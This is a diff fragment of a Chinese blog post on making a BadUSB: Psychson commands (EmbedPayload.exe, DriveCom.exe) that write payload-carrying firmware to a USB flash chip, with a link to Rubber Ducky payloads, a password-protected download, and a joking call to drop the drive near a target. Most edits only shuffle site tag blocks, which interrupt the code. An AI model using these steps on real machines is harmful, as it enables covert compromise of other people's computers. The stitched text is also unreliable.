@@ -30,11 +30,11 @@ PS：发现关于[badusb](https://mrxn.net/tag/badusb "标签：badusb")的详�
 
 深入探索
 
-闪存
+网络
 
-消费类电子产品
+黑客与破解
 
-数据管理
+VPN
 
 1.下载&编译攻击代码   
 https://github.com/hak5darren/[USB](#)-Rubber-Ducky/wiki/Payloads   
@@ -52,6 +52,14 @@ EmbedPayload.exe C:\Psychson-master\inject.bin C:\Psychson-master\firmware\bin\f
 
 `DriveCom.exe /drive=G /action=SetBootMode //设置U盘模式
 
+深入探索
+
+USB闪存盘
+
+计算机科学
+
+消费类电子产品
+
 DriveCom.exe /drive=G /action=SendExecutable /burner=BN03V104M.BIN //2302固件
 
 DriveCom.exe /drive=G /action=SendFirmware /burner=C:\Psychson-master\BN03V104M.BIN /firmware=C:\Psychson-master\firmware\bi\fw.bin //写入带有攻击代码的固件到芯片中`  
@@ -61,14 +69,6 @@ DriveCom.exe /drive=G /action=SendFirmware /burner=C:\Psychson-master\BN03V104M.
 文件打包下载链接:链接:http://pan.baidu.com/s/1jIm22bk 密码:mrxn
 
 闪存
-
-深入探索
-
-计算机硬件
-
-网络
-
-书籍
 
 疑问讨论：（玩过的大牛，都别躲着玩了，快出来科普问题，或说说猥琐的新姿势..）   
   
@@ -88,4 +88,4 @@ enjoying..（ps：去目（nv）标（shen）那丢U盘吧）
 
 原文：http://www.jeary.org/?post=51
 
-消费类电子产品
+软件
